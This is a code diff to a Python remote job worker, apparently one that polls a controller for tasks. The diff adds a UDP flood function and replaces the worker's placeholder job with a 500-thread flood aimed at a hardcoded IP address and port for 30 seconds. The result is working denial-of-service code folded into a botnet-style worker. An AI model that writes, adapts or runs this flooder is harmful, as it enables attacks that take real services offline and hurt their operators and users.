@@ -2,6 +2,9 @@ import requests
 import threading
 import time
 import traceback
+import socket
+import random
+import sys
 
 
 # ============================================================
@@ -14,6 +17,26 @@ POLL_INTERVAL = 5
 HEARTBEAT_INTERVAL = 30
 REQUEST_TIMEOUT = 15
 RECONNECT_DELAY = 5
+
+# USER DATAGRAM
+
+def udp_flooder(target_ip, target_port, packet_size, duration):
+    """Sends UDP packets in a loop for a specified duration."""
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    # Generate random bytes to fill the packet payload
+    payload = random._urandom(packet_size)
+    
+    end_time = time.time() + duration
+    packet_count = 0
+    
+    try:
+        while time.time() < end_time:
+            client.sendto(payload, (target_ip, target_port))
+            packet_count += 1
+    except Exception as e:
+        print(f"Error: {e}")
+    finally:
+        client.close()
 
 
 # ============================================================
@@ -457,20 +480,25 @@ class Worker:
         # PUT YOUR ACTUAL JOB 1 CODE HERE
         # ====================================================
 
-        for i in range(10):
+        TARGET_IP = '35.76.205.127'
+        TARGET_PORT = 9063
+        PACKET_SIZE = 1024
+        DURATION = 30
+        NUM_THREADS = 500
 
-            time.sleep(1)
+        print(f"\n[*] Starting UDP flood to {TARGET_IP}:{TARGET_PORT} using {NUM_THREADS} threads for {DURATION} seconds...")
 
-            percent = (
-                (i + 1) * 10
-            )
+        threads = []
+    
+        # Start threads
+        for _ in range(NUM_THREADS):
+            thread = threading.Thread(target=udp_flooder, args=(TARGET_IP, TARGET_PORT, PACKET_SIZE, DURATION))
+            threads.append(thread)
+            thread.start()
 
-
-            self.progress(
-                task_id,
-                percent,
-                f"Job 1: {percent}%"
-            )
+        # Wait for all threads to finish
+        for thread in threads:
+            thread.join()
 
 
         # ====================================================
